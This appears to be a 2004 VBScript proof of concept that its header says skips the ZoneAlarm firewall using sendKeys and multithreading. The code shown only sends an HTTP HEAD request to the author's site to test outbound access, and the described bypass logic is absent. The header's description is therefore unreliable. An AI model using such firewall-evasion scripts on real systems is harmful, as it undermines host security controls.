'***********************************************************
'// By Ferruh Mavituna 
'// ferruh{@}mavituna.com, http://ferruh.mavituna.com
'***********************************************************
'// Date : 4/25/2004
'// Simple POC for Skipping Zone Alarm Firewall with sendKeys and multithreading
'// Simple Firewall Test File
'// Related Advisory : NOT PUBLISHED YET
'***********************************************************
Option Explicit

Dim shell, sendKeyMod, Result
Const URL = "http://ferruh.mavituna.com"

'Connect
Wscript.Echo "Now I'll try to connect to " & URL

If connect(URL,Result) Then
	Wscript.Echo "Mission Accomplished..., Here is the headers;" & vbNewline & Result
Else
	Wscript.Echo "OK, I couldn't access to Internet"
End If

Set shell = Nothing
Wscript.Quit 1

Function connect(ByVal URL, ByRef Result)
	connect = True
	On Error Resume Next
		
		ERR.Clear
		Dim web
		Set web = CreateObject("Microsoft.XmlHttp")
		web.open "HEAD", URL, FALSE
		web.send ""
		Result = web.getAllResponseHeaders
		Set web = Nothing

	If ERR<>0 Then connect = False
End Function